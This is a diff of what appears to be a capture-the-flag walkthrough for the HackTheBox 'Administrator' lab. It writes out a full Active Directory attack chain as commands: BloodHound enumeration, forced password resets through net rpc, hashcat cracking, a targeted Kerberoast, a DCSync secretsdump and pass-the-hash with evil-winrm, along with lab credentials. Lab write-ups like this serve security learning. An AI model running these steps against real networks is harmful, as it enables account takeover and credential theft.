@@ -23,17 +23,17 @@
 
 1. Run nmap scan
 2. Given olivia's credentials, run bloodhound to gather AD info
-	1. `neo4j console`
-	2. `sudo bloodhound`
-	3. `sudo bloodhound-python -d administrator.htb -u olivia -p ichliebedich -ns [IP] -c all`
-3. load bloodhound info
-4. bloodhound finds that olivia has GenericAll privs over michael
+
+	```sudo bloodhound-python -d administrator.htb -u olivia -p ichliebedich -ns [IP] -c all```
+
+4. load bloodhound info
+5. bloodhound finds that olivia has GenericAll privs over michael
 
 ![image](https://github.com/user-attachments/assets/465491ec-fada-4fb5-93a8-c87657433cbe)
 
 5. change michael's password
-	1. ```net rpc password "michael" -U "administrator.htb"/"olivia" -S "[IP]"```
-	2. type new password
+	
+ 	```net rpc password "michael" -U "administrator.htb"/"olivia" -S "[IP]"```
 
 ![image](https://github.com/user-attachments/assets/2b513753-0287-4187-87ad-8c5822921a5b)
 
@@ -42,7 +42,8 @@
 ![image](https://github.com/user-attachments/assets/908af74c-ab83-4ecd-841c-7a0a2424dda1)
 
 7. change benjamin's password 
-	```net rpc password "benjamin" -U "administrator.htb"/"michael" -S "[IP]"```
+	
+ 	```net rpc password "benjamin" -U "administrator.htb"/"michael" -S "[IP]"```
 
 ![image](https://github.com/user-attachments/assets/075d1086-566b-4d1a-aaa8-3410f46b5664)
 
@@ -51,7 +52,8 @@
 ![image](https://github.com/user-attachments/assets/4788173f-4ac8-4391-ae25-0f660d10286f)
 
 9. use hashcat to crack password on psafe3
-	```hashcat -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt```
+	
+ 	```hashcat -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt```
 
 10. reveals password for psafe3 file is `tekieromucho`
 11. opening the psafe3 file reveals 3 credentials:
@@ -67,7 +69,8 @@
 	2. run this command `VBoxManage setextradata "VM name" "VBoxInternal/Devices/VMMDev/0/Config/GetHostTimeDisabled" 1`
 	3. then, on Kali VM, run `sudo rdate -n [IP]`
 14. now can do a targeted kerberoast attack on ethan using emily's credentials
-	```targetedKerberoast.py --dc-ip [IP] -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb```
+	
+ 	```targetedKerberoast.py --dc-ip [IP] -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb```
 
 ![image](https://github.com/user-attachments/assets/457a3b7e-2e71-48e6-8d52-8c4f11422798)
 
@@ -76,14 +79,16 @@
 ![image](https://github.com/user-attachments/assets/fbdf1e5a-0096-4f89-a890-97fc07a89c1b)
 
 16. ethan has DCSync permission over Administrator.htb. This means ethan is local admin so can do secretdump
-	```secretsdump.py administrator.htb/ethan:limpbizkit@[IP]```
+	
+ 	```secretsdump.py administrator.htb/ethan:limpbizkit@[IP]```
 
 ![image](https://github.com/user-attachments/assets/fdfcde64-d5a7-40ad-9af6-b515e73e8769)
 
 ![image](https://github.com/user-attachments/assets/2967cec7-9da7-4d2f-8dec-c0916ff50ca5)
 
 17. this gives us Administrator hash so can do PtH with evil-winrm 
-	1. `evil-winrm -i [IP] -u administrator -H [HASH]`
+	
+ 	```evil-winrm -i [IP] -u administrator -H [HASH]```
 
 ![image](https://github.com/user-attachments/assets/27ddb48f-62ec-49d8-9ba0-a104cd4df325)
 
